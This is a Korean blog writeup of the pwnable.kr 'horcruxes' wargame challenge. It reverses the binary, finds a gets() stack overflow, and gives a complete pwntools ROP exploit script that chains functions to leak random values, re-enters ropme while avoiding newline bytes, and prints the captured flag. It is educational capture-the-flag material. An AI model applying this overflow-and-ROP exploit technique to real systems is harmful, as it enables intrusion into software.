---
title: "pwnable.kr horcruxes Writeup"
description: "Archive of security studies(2018–2022)"
date: 2020-12-11T19:33:04+09:00
# weight: 1
# aliases: ["/first"]
tags: ["security"]
author: "Byeongmin Bae"
# author: ["Me", "You"] # multiple authors
draft: false
---

이번 문제는 소스가 제공되지 않습니다. 일단 현재 상황을 먼저 알아보겠습니다.

```shell
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)

====================================================

horcruxes@pwnable:~$ cat ./readme
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.

horcruxes@pwnable:~$ file ./horcruxes
./horcruxes: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=bed2c3c01d21a3cbb1109e76a83310dfb8a077be, not stripped

horcruxes@pwnable:~$ checksec --file=./horcruxes
[*] '/home/horcruxes/horcruxes'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x809f000)
```

asm 문제처럼 주어진 바이너리는 분석용이고 실제 익스는 nc 를 통해 해야 하네요

문제 소스가 제공되지 않아서 main 을 IDA 헥스레이로 봤는데 `seccomp_rule_add()` 에 넘기는 값들이 매직 넘버로 되어있어 무슨 의미인지 알기 어렵습니다.

그래서 따로 의미를 알 수 있도록 수정했습니다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    int v3; // ST1C_4

    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    alarm(0x3Cu);

    hint();
    init_ABCDEFG();

    // v3 = seccomp_init(0);
    // seccomp_rule_add(v3, 0x7FFF0000, 0xAD, 0);
    // seccomp_rule_add(v3, 0x7FFF0000, 5, 0);
    // seccomp_rule_add(v3, 0x7FFF0000, 3, 0);
    // seccomp_rule_add(v3, 0x7FFF0000, 4, 0);
    // seccomp_rule_add(v3, 0x7FFF0000, 0xFC, 0);

    // #define SCMP_ACT_KILL_THREAD	0x00000000U
    // #define SCMP_ACT_ALLOW		0x7fff0000U
    
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL_THREAD);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, 0xad, 0); // sys_rt_sigreturn
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    return ropme();
}
```

seccomp 규칙 때문에 `seccomp_load(ctx);` 가 호출된 이후부터 `rt_sigreturn`, `open`, `read`, `write`, `exit_group` 를 제외한 모든 시스템 콜이 차단됩니다.

`rt_sigreturn` 이 허용되는 걸 보니 SROP 관련 문제일까? 라고 잠시 의심했지만 `init_ABCDEFG()` 와 `rop_me()` 를 보고 생각을 바꿨습니다.

`init_ABCDEFG()` 는 전역 변수 a~g 를 랜덤 값으로 초기화하고 이 변수들을 sum 전역변수에 합산하는 함수입니다.

```c
unsigned int init_ABCDEFG()
{
    int v0; // eax
    unsigned int result; // eax
    unsigned int buf; // [esp+8h] [ebp-10h]
    int fd; // [esp+Ch] [ebp-Ch]

    fd = open("/dev/urandom", 0);
    if ( read(fd, &buf, 4u) != 4 )
    {
        puts("/dev/urandom error");
        exit(0);
    }
    close(fd);
    srand(buf);
    a = 0xDEADBEEF * rand() % 0xCAFEBABE;
    b = 0xDEADBEEF * rand() % 0xCAFEBABE;
    c = 0xDEADBEEF * rand() % 0xCAFEBABE;
    d = 0xDEADBEEF * rand() % 0xCAFEBABE;
    e = 0xDEADBEEF * rand() % 0xCAFEBABE;
    f = 0xDEADBEEF * rand() % 0xCAFEBABE;
    v0 = rand();
    g = 0xDEADBEEF * v0 % 0xCAFEBABE;
    result = f + e + d + c + b + a + 0xDEADBEEF * v0 % 0xCAFEBABE;
    sum = result;
    return result;
}
```

그리고 `ropme()` 에서는 `init_ABCDEFG()` 에서 초기화된 a~g 까지의 모든 랜덤 값을 정확히 알고 있어야만 플래그를 읽을 수 있도록 되어 있습니다.

현재 난수 시드로 사용되고 있는 `/dev/urandom` 은 암호학적으로 예측이 불가능하고 시드 변수값 leak 도 어려운 상황입니다.

```c
int ropme()
{
    char s[100]; // [esp+4h] [ebp-74h]
    int v2; // [esp+68h] [ebp-10h]
    int fd; // [esp+6Ch] [ebp-Ch]

    printf("Select Menu:");
    __isoc99_scanf("%d", &v2);
    getchar();
    if ( v2 == a ){ A(); }
    else if ( v2 == b ){ B(); }
    else if ( v2 == c ){ C(); }
    else if ( v2 == d ){ D(); }
    else if ( v2 == e ){ E(); }
    else if ( v2 == f ){ F(); }
    else if ( v2 == g ){ G(); }
    else {
        printf("How many EXP did you earned? : ");
        gets(s);
        if ( atoi(s) == sum )
        {
            fd = open("flag", 0);
            s[read(fd, s, 0x64u)] = 0;
            puts(s);
            close(fd);
            exit(0);
        }
        puts("You'd better get more experience to kill Voldemort");
    }
    return 0;
}
```

그런데 잘 보면 중간 라인에서 길이 검증 없이 `gets(s);` 를 통해 사용자 입력을 받고 있습니다. 이 부분을 공략해야 합니다.

`s` 배열은 ret 영역으로부터 120바이트 떨어져 있으니 여길 덮으면 `ropme()` 가 종료된 후의 실행 흐름을 조작할 수 있습니다.

그리고 `A()` 부터 `G()` 를 보면 죄다 a 부터 g 까지의 전역변수를 exp 취급하여 출력합니다.

```c
int A()
{
    return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);
}
int B()
{
    return printf("You found \"Marvolo Gaunt's Ring\" (EXP +%d)\n", b);
}
...동일 패턴...
```

여기까지 왔다면 거의 다 푼것이나 마찬가지입니다.

`ropme()` 의 ret 를 `A()` ~ `G()` 의 주소로 체이닝 해주면 a~g 전역변수를 출력하게 됩니다. 출력된 정규식으로 뽑아내어 전체 값을 더하면 sum 의 값을 알 수 있습니다.

```plaintext
FUNC SEGMENT START      LENGTH     LOCAL      ARGUMENT
A    .text   0809FE4B   0000001F   0000000C   00000000
B    .text   0809FE6A   0000001F   0000000C   00000000
C    .text   0809FE89   0000001F   0000000C   00000000
D    .text   0809FEA8   0000001F   0000000C   00000000
E    .text   0809FEC7   0000001F   0000000C   00000000
F    .text   0809FEE6   0000001F   0000000C   00000000
G    .text   0809FF05   0000001F   0000000C   00000000
```

이후에 `ropme()` 를 한번 더 호출해서 알아낸 sum 값을 넣어주기만 하면 문제가 풀릴것으로 예상이 됩니다.

그런데 페이로드에 `ropme()` 주소를 전달하는 과정에서 문제가 생겼습니다.

`ropme()` 의 주소는 `0x080A0009` 인데, 입력을 받는 `gets()` 는 입력값에 `0x0a` 가 포함된 경우 EOL 로 판단하기 때문에 이 값이 들어가는 주소는 페이로드에 넣을 수 없습니다.

```shell
andrew@ubuntu:~/fun/writeups/wargame/pwnablekr/horcruxes$ cat /proc/5413/maps
0809f000-080a1000 r-xp 00000000 08:01 1837777                            /home/andrew/fun/writeups/wargame/pwnablekr/horcruxes/horcruxes
080a1000-080a2000 r--p 00001000 08:01 1837777                            /home/andrew/fun/writeups/wargame/pwnablekr/horcruxes/horcruxes
080a2000-080a3000 rw-p 00002000 08:01 1837777                            /home/andrew/fun/writeups/wargame/pwnablekr/horcruxes/horcruxes
```

메모리 맵을 확인해보니 대부분의 영역에는 `0x0a` 가 포함됩니다.

`ropme()` 를 재호출 하는 방법은 없을까요?

다행이도 `ropme()` 를 호출하는 `main()` 쪽 주소는 `0x0809FFFC` 입니다. `0x0a` 가 없으니 쓸 수 있습니다.

이제 익스를 작성해보겠습니다!

```python
from pwn import *
import re, time

# context.update(arch="i386", os="linux", bits="32", log_level="debug")

conn = connect("0", 9032)

addr_A = 0x0809FE4B
addr_B = 0x0809FE6A
addr_C = 0x0809FE89
addr_D = 0x0809FEA8
addr_E = 0x0809FEC7
addr_F = 0x0809FEE6
addr_G = 0x0809FF05
call_ropme = 0x0809FFFC

payload = "\x90"*120
payload += p32(addr_A)
payload += p32(addr_B)
payload += p32(addr_C)
payload += p32(addr_D)
payload += p32(addr_E)
payload += p32(addr_F)
payload += p32(addr_G)
payload += p32(call_ropme)

conn.sendline("1")
conn.sendline(payload)

response = conn.recvrepeat(1.0)

pattern = re.compile(r"\+(-?\d+)")
exp_list = pattern.findall(response)
log.info("exp_list: " + str(exp_list))

total_exp = sum(map(int, exp_list))
log.info("total_exp: " + str(total_exp))

conn.sendline("1")
conn.sendline(str(total_exp))

conn.interactive()
```

ssh 접속해서 tmp 에 익스 파일 만들고 실행하면 됩니다.

```shell
horcruxes@ubuntu:~$ python2 /tmp/234234234.py
[+] Opening connection to 0 on port 9032: Done
[*] exp_list: ['1125745878', '1804627037', '722734381', '-1952128979', '1576604163', '-1497485353', '-979023603']
[*] total_exp: 801073524
[*] Switching to interactive mode
How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra

[*] Got EOF while reading in interactive
$  
```

읽어주셔서 감사합니다.